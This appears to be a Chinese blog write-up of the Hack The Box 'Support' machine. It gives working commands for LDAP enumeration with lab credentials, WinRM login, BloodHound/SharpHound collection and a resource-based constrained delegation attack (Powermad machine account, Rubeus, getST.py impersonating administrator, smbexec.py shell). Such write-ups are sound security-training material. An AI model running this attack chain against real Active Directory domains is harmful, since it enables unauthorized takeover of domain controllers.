+++
ShowToc = true
TocOpen = true
title = '0X016 Support'
date = 2024-10-11T14:25:59+08:00
draft = false
private = true
show_reading_time = true
categories = 'HTB'
+++



# 端口扫描

![](/htb_img/WEBRESOURCE5210351ecaab4ed72e1b4bf8ee75765d截图.png)

![](/htb_img/WEBRESOURCEed69e887f32981ad919d9524cb6f0090截图.png)

# 渗透测试

没有开放HTTP协议，主要是通过域内渗透方式进行

SMB匿名登录：

![](/htb_img/WEBRESOURCEbff327d0f4c284b632ee844164d0370b截图.png)

![](/htb_img/WEBRESOURCE88308eb72b82e88e52dc73b8cbf33134截图.png)

这出现一个问题，不知到为啥，抓包看不到程序的发包

![](/htb_img/WEBRESOURCEb07edaf8d168cda964765ef93f596c6e截图.png)

主要考点：LDAP 轻量目录访问协议，理解上更像是一个树状图

ldapsearch似乎-h与-p结合的使用方式被停用了？，帮助里面没看到这个用法，只能用-H了，

-x使用简单认证

-D用户名

-w密码

-W交互式输入密码

-b指定basedn查询，分辨名，唯一标识，根

```
ldapsearch -H ldap://10.10.11.174 -D ldap@support.htb -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" "*"
```

![](/htb_img/WEBRESOURCE8fea50f5a65115346894cbd65d4dd4df截图.png)

发现密码，这里可以使用crackmapexec进行探测，这是一个用户内网渗透的探测工具：

![](/htb_img/WEBRESOURCE7907cef0313332cde4376717d6f59cec截图.png)

evil-winrm工具是 Winrm 服务利用工具，需要合法用户身份信息，使用5985端口连接：

```
evil-winrm -u support -p Ironside47pleasure40Watchful -i 10.10.11.174
```

![](/htb_img/WEBRESOURCE58222552f72ea8805bbf63f007591aec截图.png)

查看flag

![](/htb_img/WEBRESOURCEa8e93bca57d16f39f255af6e70fb5c09截图.png)

# 提权

BloodHound是一款用于域分析的强大工具，它可以帮助安全专业人员识别和分析Active Directory（AD）环境中的攻击路径和权限问题。本文将介绍BloodHound的基本概念，并提供一些使用BloodHound进行域分析的编程实例。

BloodHound的使用：

启动：

```
1、开启neo4j数据库：
neo4j start
访问本地的7474端口即可看到web页面，默认账密：neo4j，第一次使用需要修改密码
2、kali启动BloodHound：
./BloodHound --no-sandbox
```

离线脚本使用：

```
1、上传windows版本的脚本，存放在以下路径：
BloodHound-linux-x64/resources/app/Collectors
2、运行即可
SharpHound.exe -c all
```

玩了半天终于玩儿明白了，原来人家回自动分析路径：

![](/htb_img/WEBRESOURCE5b4f95d646769f2b0e55d384e6720c30截图.png)

这里建议使基于资源的约束型委派进行攻击，下面为必要工具的介绍：

Powermad.ps1是一个专门拿来利用机器账户和DNS的漏洞利用工具，在基于资源的约束型委派中用来创建机器账户：

[https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1](https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1)

PowerView.ps1是一个

[https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)

Rubeus.exe是一个用于kerberos交互的工具：

这个工具版本比较多，这里用的是[https://github.com/r3motecontrol/Ghostpack-CompiledBinaries](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)

# 基于资源的约束型委派流程如下：


```
一、导入模块：
Import-Module ./Powermad.ps1
或者
. ./Powermad.ps1
二、添加机器账户，基于资源的约束型委派需要：
Set-Variable -Name "FakePC" -Value "FAKE01"  # FAKE01这个名字可以自己改
Set-Variable -Name "targetComputer" -Value "DC"
New-MachineAccount -MachineAccount (Get-Variable -Name "FakePC").Value -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
三、设置权限
Set-ADComputer (Get-Variable -Name "targetComputer").Value -PrincipalsAllowedToDelegateToAccount ((Get-Variable -Name "FakePC").Value + '$')
四、生成hash
./Rubeus.exe hash /password:123456 /user:FAKE01$ /domain:support.htb
五、利用hash申请票据
添加hosts文件
echo "10.10.11.174 support.htb" >> /etc/hosts
echo "10.10.11.174 dc.support.htb" >> /etc/hosts
生成TGT票据，以administrator的身份申请一张访问http/dc.support.htb服务的票据
python3 getST.py support.htb/FAKE01 -dc-ip dc.support.htb -impersonate administrator -spn http/dc.support.htb -aesKey 35CE465C01BC1577DE3410452165E5244779C17B64E6D89459C1EC3C8DAA362B
六、连接
添加票据
export KRB5CCNAME=administrator.ccache
smbexec.py support.htb/administrator@dc.support.htb -no-pass -k
```

![](/htb_img/WEBRESOURCE0174ceeddf8e6fced5547680212b3a9a截图.png)

![](/htb_img/WEBRESOURCE1d0b1b97bb10fab3f753ee041f05d5f6截图.png)

记得给sudo权限：

![](/htb_img/WEBRESOURCE38c9c9cd98e6cb74f3c27b8f28ab0b74截图.png)

![](/htb_img/WEBRESOURCE8c4f89dd6bf3858148010d2d279bf70b截图.png)